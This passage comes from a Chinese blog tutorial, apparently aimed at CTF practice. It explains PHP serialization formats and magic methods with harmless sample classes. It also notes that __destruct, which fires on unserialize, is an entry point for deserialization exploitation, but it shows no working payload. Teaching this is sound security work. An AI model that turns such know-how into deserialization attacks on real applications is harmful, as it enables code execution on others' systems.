title="匿名类"></a>匿名类</h5><p>匿名类是为了解决临时实现某个抽象类或者接口类实例用的</p><p>匿名类我们关注的点是临时执行下我们自定义的run方法,这个类其他地方也用不到,所以我们不需要给它专门起名定义,占用代码行数,反正Command类的run方法关心的是传入的对象有没有run方法,而不关心传入的对象叫什么名字.</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$var</span> -&gt; <span class="title function_ invoke__">run</span>();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$command</span>-&gt;<span class="title function_ invoke__">run</span> (<span class="keyword">new</span> <span class="keyword">class</span>&#123;</span><br><span class="line">  function <span class="title function_ invoke__">run</span>()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;临时用的所以不起名字&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h4><p>所有PHP里面的值都可以使用函数<code>serialize()</code>来返回一个包含字节流的字符串来表示.<code>unserialize()</code>函数能够重新把字符串变回PHP原来的值. 序列化一个对象将会保存对象的所有变量,但不会保存对象的方法,只会保存类的名字.</p><p>对象序列化 <code>serialize</code>方法,返回字符串,此字符串包含了表示value的字节流,可以存储于任何地方,有利于存储或传递PHP的值,同时不丢失其类型和结构.</p><p>对象反序列化 <code>unserialize</code>方法,对单一的已序列化的变量进行操作,将其转换回PHP值.</p><ul><li><input checked disabled type="checkbox"> 字符串和数字都可以序列化/反序列化</li></ul><h2 id="第二节-php的序列化与反序列化"><a href="#第二节-php的序列化与反序列化" class="headerlink" title="第二节 php的序列化与反序列化"></a>第二节 php的序列化与反序列化</h2><h3 id="0x3-序列化与反序列化"><a href="#0x3-序列化与反序列化" class="headerlink" title="0x3 序列化与反序列化"></a>0x3 序列化与反序列化</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>序列化的本质是将内存中的对象,转换为可以保存,传输的字符</p><p>在php中,我们不仅可以序列化对象的实例,也可以序列化一些基本类型</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;charmersix&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$name</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以得到序列化字符串</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210031520075.png" alt="image-20221002180711339"></p><p>其中第一个s表示被序列化的对象类型,s指string</p><p>后面紧跟一个冒号和数字,表示属性的长度,后面冒号+双引号表示属性的内容</p><p>我们也可以尝试序列化一个我们自定义的类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>可以看到一个对象被序列化以后的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>一个对象，名字是6个字符，内容是Animal，有一个属性，是个字符串，名字由4个字符组成，是name，没有值，是Null</p><p>属性是有权限的，当属性权限为<code>protected</code>时,可以看到序列化结果为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;*name&quot;</span>;N;&#125;</span><br><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Animal%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>属性名字前加了*表示这个属性是<code>protected</code>权限,其实这里还有不可见字符,可以看到长度是7</p><p>那么增加的不可见字符是什么呢,就是<code>\x00*\x00</code>,三个字符加上name的4个字符,刚好是7字符,可以通过<code>urlencode</code>发现不可见字符,所以遇到非public属性进行序列化时,一定不要直接复制输出,除非进行了<code>urlencode</code>编码</p><p>如果是私有属性反序列化后是类名+属性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">12</span>:<span class="string">&quot;Animalname&quot;</span>;N;&#125;</span><br><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Animal%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Animal%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>可以看到我们虽然序列化的是子类,但是会把父类的私有属性也序列化进去,甚至可以吧<code>trait</code>看成一种特殊的继承类,也会被序列化进去</p><p>抽象类和接口都无法序列化,但是匿名类可以序列化</p><p>对象的属性也可以为对象</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">action</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">action</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">think</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">Human</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">new</span> = <span class="variable">$h</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>这时候，序列化后的字符串为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;new&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;Human&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;gender&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;move&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;step&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>一个对象,名字是6个字符,内容是Animal,有1个属性,属性名字是字符串,长度为4,内容name,值是一个对象,对象名字是5个字符,内容是Human,包含三个属性,分别是6个字符的gender,4个字符的name,以及4个字符的move</p><p>总结:</p><p>序列化就是对一个对象的所有属性,用字符串描述出来,方便反序列化时还原</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>反序列化是对已经序列化后的字符串,重新构造出一个对象使用<code>unserialize</code></p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="comment">//echo serialize ($a);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//得到序列化以后的结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&#x27;O:6:&quot;Animal&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$panda</span> = <span class="title function_ invoke__">unserialize</span> (<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$panda</span> -&gt;name;</span><br></pre></td></tr></table></figure><p>可以看到输出了一个<code>panda</code></p><p>php对于不识别的类被反序列化后,会给自动分配一个类名,这个类名就是<code>__PHP_Incomplete_Class</code></p><p>总结:</p><ol><li>反序列化时,必须反序列化已经存在的类</li><li><code>unserialize</code>函数的参数,必须是字符串</li><li><code>unserialize</code>函数返回的是转换之后的值,可为integer、float、string、array、或object，如果传递的字符串不可解序列化，则返回false</li></ol><p>这里说的存在的类，是指在PHP脚本或所包含的文件中，有class关键字定义的类</p><h3 id="0x4-PHP中的魔术方法"><a href="#0x4-PHP中的魔术方法" class="headerlink" title="0x4 PHP中的魔术方法"></a>0x4 PHP中的魔术方法</h3><p>在php中，存在众多的魔法方法，是每个对象默认都有的方法，不管定义不定义，都会存在</p><p>首先总结一下干货, 方便食用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__construct：在创建对象时候初始化对象，一般用于对变量赋初值。</span><br><span class="line">__destruct：和构造函数相反，当对象所在函数调用完毕后执行。</span><br><span class="line">__call：当调用对象中不存在的方法会自动调用该方法。</span><br><span class="line"><span class="title function_ invoke__">__get</span>()：获取对象不存在的属性时执行此函数。</span><br><span class="line"><span class="title function_ invoke__">__set</span>()：设置对象不存在的属性时执行此函数。</span><br><span class="line">__toString：当对象被当做一个字符串使用时调用。</span><br><span class="line">__sleep：序列化对象之前就调用此方法(其返回需要一个数组)</span><br><span class="line">__wakeup：反序列化恢复对象之前调用该方法</span><br><span class="line"><span class="title function_ invoke__">__isset</span>()：在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line"><span class="title function_ invoke__">__unset</span>()：在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() ：将对象当作函数来使用时执行此方法</span><br></pre></td></tr></table></figure><h4 id="sleep和wakeup方法"><a href="#sleep和wakeup方法" class="headerlink" title="sleep和wakeup方法"></a>sleep和wakeup方法</h4><p>魔法方法是以两个下划线开头的方法</p><p>其中<code>__sleep</code>方法是序列化的时候，自动调用的方法</p><p><code>serialize()</code>函数会检查类中是否存在一个魔术方法<code>__sleep()</code>如果存在,该方法会被调用,然后才执行序列化操作.此功能可以用于清理对象,并返回一个包含对象中所有应被序列化的变量名称数组.</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;color&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>打印结果为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;panda&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;color&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;red&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//序列化后只有name和color</span></span><br></pre></td></tr></table></figure><p>同构<code>__sleep</code>方法清理后,<code>move</code>属性并没有进入序列化后的结果和<code>__sleep</code>方法对应的是<code>wakeup</code>方法,表示反序列化时,对所反序列化的属性进行处理<code>wakeup</code>函数可以不需要返回值,时对对象的属性进行一些初始化操作</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;color&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span> -&gt; name = <span class="string">&quot;tiger&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $a = new Animal();</span></span><br><span class="line"><span class="comment">// echo serialize ($a);</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;O:6:&quot;Animal&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;s:5:&quot;color&quot;;s:3:&quot;red&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> -&gt; name;</span><br></pre></td></tr></table></figure><p>可以看到,我们这里反序列化的属性值,不管是不是panda,最终反序列化后,都变成了tiger,所以wakeup方法会在反序列化前被调用,用来提前处理属性的值</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210031935656.png" alt="image-20221003193513620"></p><h4 id="construct和destruct方法"><a href="#construct和destruct方法" class="headerlink" title="construct和destruct方法"></a>construct和destruct方法</h4><p>和上面方法类似,这里成为构造函数和析构函数</p><p>表示对象在实例化时执行的函数和对象要销毁前执行的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;color&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span> -&gt; name = <span class="string">&quot;tiger&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;对象被new时执行&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;对象被销毁时执行&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br></pre></td></tr></table></figure><p>也就是说,在PHP代码中,实例化一个对象的时候,会自动调用类的<code>__construct</code>方法,当前php脚本即将运行结束,就会调用已经实例化的类的<code>__destruct</code>方法 所以上面的栗子会先调用前者,再调用后者.</p><p>但是,如果单纯的进行反序列化,不实例化对象时,只会调用<code>__destruct</code>方法</p><p>这里会是一个明显的调用入口,如果我们反序列化一个拥有<code>__destruct</code>方法的对象时,会自动调用这个析构方法,而如果这个析构方法中,有我们可以控制的值,那么就可以实现我们恶意代码内容</p><p>在php反序列化利用，析构方法是很好的入手点，但是我们可能不一定能够找到非常合适的析构方法供我们使用</p><h4 id="call和callStatic方法"><a href="#call和callStatic方法" class="headerlink" title="call和callStatic方法"></a>call和callStatic方法</h4><p>在对象中调用一个不可访问的方法时，<code>__call()</code>会被调用</p><p>在静态上下文中调用一个不可访问的方法时, <code>__callStatic()</code>会被调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i called method&quot;</span>.<span class="variable">$name</span>. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;args is &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$args</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cs</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$cs</span>-&gt;<span class="title function_ invoke__">go</span>(<span class="number">1</span>, <span class="string">&quot;CT&quot;</span>,<span class="string">&quot;m4a1&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="get、set和isset、unset"><a href="#get、set和isset、unset" class="headerlink" title="get、set和isset、unset"></a>get、set和isset、unset</h4><ul><li>在给不可访问属性赋值时,<code>__set()</code>会被调用.</li><li>读取不可访问属性的值时,<code>__get()</code>会被调用.</li><li>当对不可访问属性调用<code>isset()</code>或<code>empty()</code>时,<code>__isset()</code>会被调用.</li><li>当对不可访问属性调用<code>unset()</code>时,<code>__unset()</code>会被调用.</li></ul><h4 id="tostring方法"><a href="#tostring方法" class="headerlink" title="tostring方法"></a>tostring方法</h4><p><code>__toString()</code>方法用于一个类被当成字符串时应怎样回应.例如<code>echo $obj;</code>应该显示些什么.此方法必须返回一个字符串,否则将发出一条<code>E_RECOVERABLE_ERROR</code>级别的致命错误.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&quot;you never know my secret&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 